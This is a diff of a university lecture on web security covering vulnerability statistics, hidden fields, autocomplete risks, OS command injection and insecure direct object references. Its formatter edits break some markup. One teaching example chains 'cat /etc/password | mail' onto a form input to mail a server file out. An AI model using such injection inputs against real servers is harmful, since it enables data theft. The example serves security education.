@@ -14,7 +14,7 @@ warning: true
 
 - [Required & recommended readings and activities](#required--recommended-readings-and-activities)
 - [:scroll: Learning goals](#scroll-learning-goals)
-- [Introduction](#introduction)
+- [Introduction to web security](#introduction-to-web-security)
 - [Threat examples](#threat-examples)
   - [Defacement](#defacement)
   - [Data disclosure](#data-disclosure)
@@ -85,7 +85,7 @@ warning: true
 
 _Note that cybersecurity is a huge area of work, here at TU Delft we have a special program at the Master level dedicated to cybersecurity. In one lecture we can only give a small glimpse into the issues web developers face when it comes to security issues._
 
-## Introduction
+## Introduction to web security
 
 Web applications are an attractive target for _attackers_ (also known as _malicious users_) for several reasons:
 
@@ -166,7 +166,7 @@ The most important **software security issues** for web and mobile applications 
 
 <sup>Most important software security issues. Figure taken from page 56, CSRHPE.</sup>
 
-:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the _security features_ category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The _environment_ category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is _input validation and representation_ which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
+:point*up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the \_security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The _environment_ category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is _input validation and representation_ which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
 
 If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as the _percentage of applications_ and _median vulnerability count_:
 
@@ -174,9 +174,9 @@ If we zoom in on the non-mobile applications, the ten most commonly occurring vu
 
 <sup>Top 10 vulnerabilities. Figure taken from page 57, CSRHPE.</sup>
 
-:point_up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically _Cookie Security: cookie not sent over SSL_ and _Cookie Security: HTTPOnly not set_. The vulnerability _Privacy violation: autocomplete_ should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
+:point*up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically \_Cookie Security: cookie not sent over SSL* and _Cookie Security: HTTPOnly not set_. The vulnerability _Privacy violation: autocomplete_ should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
 
-:point_up: Lastly, let's discuss the _Hidden field_ vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
+:point*up: Lastly, let's discuss the \_Hidden field* vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
 
 Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as _percentage of applications violating a category_ :point_down::
 
@@ -184,7 +184,7 @@ Taking a slightly higher-level view, the top five violated security categories a
 
 <sup>Top 5 violated security categories. Figure taken from page 59, CSRHPE.</sup>
 
-:point_up: The only category not covered so far is _Insecure transport_. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
+:point*up: The only category not covered so far is \_Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
 
 ![Juice Shop not secure](../img/security-browser-warning-juiceshop.png)
 
@@ -237,7 +237,7 @@ Injection attacks on the server can take multiple forms, we first consider **OS 
 
 <sup>OS command injection.</sup>
 
-:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (_Thank you for signing up for our mailing list._). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
+:point*up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (\_Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
 
 - The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
 - An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly _unintended code execution_.
@@ -496,7 +496,7 @@ app.get("/wishlist/:priority", function (req, res, next) {
 });
 ```
 
-Here :point_up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called _insecure direct object references_. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
+Here :point*up:, we use the routing parameter `:priority` as property name of the `wishlistPriorities` object. Applications that do not verify whether a user requesting a particular route is authorized to access the route face security issues. In our concrete code example, this leads to so-called \_insecure direct object references*. A malicious user can test a range of target URLs that should require authentication to determine whether this issue exists. This is especially easy for large web frameworks which come with a number of default routes enabled.
 
 Consider a user who accesses her wishlist using the following URL `http://mywishlist.nl/wishlist?id=234`. Nothing stops the user from also trying, e.g., `http://mywishlist.nl/wishlist?id=2425353` or `http://mywishlist.nl/wishlist?id==1`. If the id values are insecure direct object references, the user can view other users' wishlists in this manner.
 
